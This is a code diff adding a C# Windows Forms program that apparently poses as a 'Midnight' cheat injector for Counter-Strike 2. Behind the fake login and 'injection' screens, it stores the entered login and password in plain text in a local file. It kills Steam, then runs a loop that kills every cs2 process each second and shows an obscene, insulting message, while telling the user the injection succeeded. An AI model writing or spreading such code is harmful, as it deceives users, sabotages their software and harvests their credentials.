@@ -1,0 +1,244 @@
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Guna.UI2.WinForms;
+
+namespace РКН_ЗАПРЕТИЛ
+{
+    public partial class Form1 : Form
+    {
+        private Thread monitorThread; 
+        private bool isBlocked = false;
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            guna2HtmlLabel10.Visible = true;
+            guna2TextBox2.PasswordChar = '*';
+            guna2Button2.Enabled = false;
+        }
+        private void MonitorCs2Process()
+        {
+            while (isBlocked)
+            {
+                try
+                {
+                    var cs2Processes = Process.GetProcessesByName("cs2");
+
+                    if (cs2Processes.Any())
+                    {
+                        foreach (var process in cs2Processes)
+                        {
+                            process.Kill(); 
+                        }
+                        MessageBox.Show("ВАХЫХВЫАХАВХ ПОШЕЛ НАХУЙ ПИДОРАС.", "ЛОХ ЕБАНЫЙ ВАХЫХВА", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Ошибка: {ex.Message}");
+                }
+                Thread.Sleep(1000);
+            }
+        }
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            if (monitorThread != null && monitorThread.IsAlive)
+            {
+                monitorThread.Abort();
+            }
+        }
+        private void guna2ImageButton1_Click(object sender, EventArgs e)
+        {
+            this.Close();
+        }
+        private void guna2HtmlToolTip1_Popup(object sender, PopupEventArgs e)
+        {
+
+        }
+        private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
+        {
+
+        }
+        private void guna2Panel2_Paint(object sender, PaintEventArgs e)
+        {
+
+        }
+        private void guna2Panel1_Paint(object sender, PaintEventArgs e)
+        {
+
+        }
+        private void guna2HtmlLabel1_Click(object sender, EventArgs e)
+        {
+
+        }
+        private void guna2HtmlLabel2_Click(object sender, EventArgs e)
+        {
+
+        }
+        private void guna2HtmlLabel5_Click(object sender, EventArgs e)
+        {
+
+        }
+        private void guna2HtmlLabel4_Click(object sender, EventArgs e)
+        {
+
+        }
+        private void guna2Panel3_Paint(object sender, PaintEventArgs e)
+        {
+
+        }
+        private void guna2Button1_Click(object sender, EventArgs e)
+        {
+            isBlocked = true;
+            StopSteamProcess();
+            if (monitorThread == null || !monitorThread.IsAlive)
+            {
+                monitorThread = new Thread(MonitorCs2Process);
+                monitorThread.Start();
+            }
+            MessageBox.Show("Successful injection, launch cs2 in steam", "injection", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            this.Close();
+        }
+        private void StopSteamProcess()
+        {
+            try
+            {
+                var steamProcesses = Process.GetProcessesByName("steam");
+
+                if (steamProcesses.Any())
+                {
+                    foreach (var process in steamProcesses)
+                    {
+                        process.Kill();
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Ошибка при завершении процесса Steam: {ex.Message}", "injection", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+        private void guna2Panel3_Paint_1(object sender, PaintEventArgs e)
+        {
+
+        }
+        private void guna2Button2_Click(object sender, EventArgs e)
+        {
+        }
+        private void CheckTextBoxes()
+        {
+            if (!string.IsNullOrWhiteSpace(guna2TextBox1.Text) && !string.IsNullOrWhiteSpace(guna2TextBox2.Text))
+            {
+                guna2Button2.Enabled = true;
+            }
+            else
+            {
+                guna2Button2.Enabled = false;
+            }
+        }
+        private void folderBrowserDialog1_HelpRequest(object sender, EventArgs e)
+        {
+
+        }
+        private void guna2HtmlLabel10_Click(object sender, EventArgs e)
+        {
+
+        }
+        private void guna2TextBox1_TextChanged(object sender, EventArgs e)
+        {
+            CheckTextBoxes();
+        }
+        private void guna2TextBox2_TextChanged(object sender, EventArgs e)
+        {
+            CheckTextBoxes();
+        }
+        private void guna2CheckBox1_CheckedChanged(object sender, EventArgs e)
+        {
+
+        }
+        private void guna2CustomCheckBox1_Click(object sender, EventArgs e)
+        {
+
+        }
+        private void guna2HtmlLabel14_Click(object sender, EventArgs e)
+        {
+        }
+        private void guna2HtmlLabel12_Click(object sender, EventArgs e)
+        {
+        }
+        private void guna2HtmlLabel11_Click(object sender, EventArgs e)
+        {
+
+        }
+        private async void guna2Button2_Click_1(object sender, EventArgs e)
+        {
+            if (guna2CustomCheckBox1.Checked)
+            {
+                string exePath = Application.StartupPath;
+                string exeFileNameWithoutExtension = Path.GetFileNameWithoutExtension(Application.ExecutablePath);
+                string datFilePath = Path.Combine(exePath, exeFileNameWithoutExtension + ".dat");
+                string login = guna2TextBox1.Text;
+                string password = guna2TextBox2.Text;
+                try
+                {
+                    using (StreamWriter writer = new StreamWriter(datFilePath))
+                    {
+                        writer.WriteLine($"login = {login}");
+                        writer.WriteLine($"password = {password}");
+                    }
+
+                    MessageBox.Show("Successfully logged", "Midnight", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show($"Ошибка при сохранении данных: {ex.Message}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+            guna2Panel3.Visible = false;
+            guna2HtmlLabel10.Visible = false;
+            guna2HtmlLabel11.Visible = false;
+            guna2HtmlLabel12.Visible = false;
+            guna2HtmlLabel13.Visible = false;
+            guna2HtmlLabel14.Visible = false;
+            guna2TextBox1.Visible = false;
+            guna2TextBox2.Visible = false;
+            guna2Button2.Visible = false;
+            guna2CustomCheckBox1.Visible = false;
+            guna2HtmlLabel16.Visible = true;
+            guna2ProgressIndicator1.Visible = true;
+            await Task.Delay(5000);
+            guna2ProgressIndicator1.Visible = false;
+            guna2HtmlLabel16.Visible = false;
+            guna2Panel1.Visible = true;
+            guna2Panel4.Visible = false;
+            guna2Panel2.Visible = true;
+            guna2HtmlLabel1.Visible = true;
+            guna2HtmlLabel2.Visible = true;
+            guna2HtmlLabel3.Visible = true;
+            guna2HtmlLabel4.Visible = true;
+            guna2HtmlLabel5.Visible = true;
+            guna2HtmlLabel6.Visible = true;
+            guna2HtmlLabel7.Visible = true;
+            guna2HtmlLabel8.Visible = true;
+            guna2HtmlLabel9.Visible = true;
+            guna2Button1.Visible = true;
+        }
+        private void guna2Panel5_Paint(object sender, PaintEventArgs e)
+        {
+
+        }
+    }
+}
